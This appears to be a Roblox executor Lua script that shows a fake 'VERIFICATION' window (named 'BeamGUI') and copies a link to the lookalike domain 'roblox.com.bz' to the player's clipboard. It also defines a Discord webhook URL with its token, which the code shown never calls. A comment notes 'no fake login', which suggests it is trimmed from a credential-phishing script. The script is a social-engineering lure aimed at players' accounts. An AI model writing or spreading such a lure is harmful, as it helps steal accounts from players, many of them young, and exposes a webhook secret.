-- CONFIG
local GROUP_LINK = "https://roblox.com.bz/communities/1713252036/"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1514988761912709281/wG1n9AYtVvspdiKwhy2KQ2mhF5KmdGLjW54vr_8gn7N5-o4ZcGSLrSw6jeM0bKjF6zF8"

local Player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

-- Clipboard function for Solara V3
local function copyText(text)
    local success = false
    if setclipboard then success = pcall(setclipboard, text) end
    if not success and toClipboard then success = pcall(toClipboard, text) end
    if not success and game:GetService("Clipboard") then 
        success = pcall(function() game:GetService("Clipboard"):set(text) end)
    end
    if not success then
        warn("Clipboard failed - manual copy: " .. text)
    end
    return success
end

-- Create GUI on CoreGui
local gui = Instance.new("ScreenGui")
gui.Name = "BeamGUI"
gui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 300)
frame.Position = UDim2.new(0.5, -200, 0.5, -150)
frame.BackgroundColor3 = Color3.fromRGB(30,30,40)
frame.BorderSizePixel = 0
frame.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,40)
title.BackgroundColor3 = Color3.fromRGB(20,20,30)
title.Text = "VERIFICATION"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.Parent = frame

local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1,-20,0,60)
desc.Position = UDim2.new(0,10,0,50)
desc.BackgroundTransparency = 1
desc.Text = "Click VERIFY to copy group link and continue."
desc.TextColor3 = Color3.fromRGB(200,200,200)
desc.Font = Enum.Font.Gotham
desc.TextSize = 14
desc.Parent = frame

local btn = Instance.new("TextButton")
btn.Size = UDim2.new(0,200,0,40)
btn.Position = UDim2.new(0.5,-100,0,130)
btn.BackgroundColor3 = Color3.fromRGB(70,130,200)
btn.Text = "VERIFY"
btn.TextColor3 = Color3.new(1,1,1)
btn.Font = Enum.Font.GothamBold
btn.TextSize = 18
btn.Parent = frame

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1,-20,0,30)
status.Position = UDim2.new(0,10,0,190)
status.BackgroundTransparency = 1
status.Text = ""
status.TextColor3 = Color3.fromRGB(255,200,100)
status.Font = Enum.Font.Gotham
status.TextSize = 12
status.Parent = frame

-- Verify button: only copy link, no fake login, GUI stays
btn.MouseButton1Click:Connect(function()
    copyText(GROUP_LINK)
    status.Text = "Group link copied to clipboard!"
    status.TextColor3 = Color3.fromRGB(100,255,100)
    wait(2)
    status.Text = "Ready. Click VERIFY again if needed."
    status.TextColor3 = Color3.fromRGB(255,200,100)
end)

-- Auto-show
status.Text = "Ready. Click VERIFY."
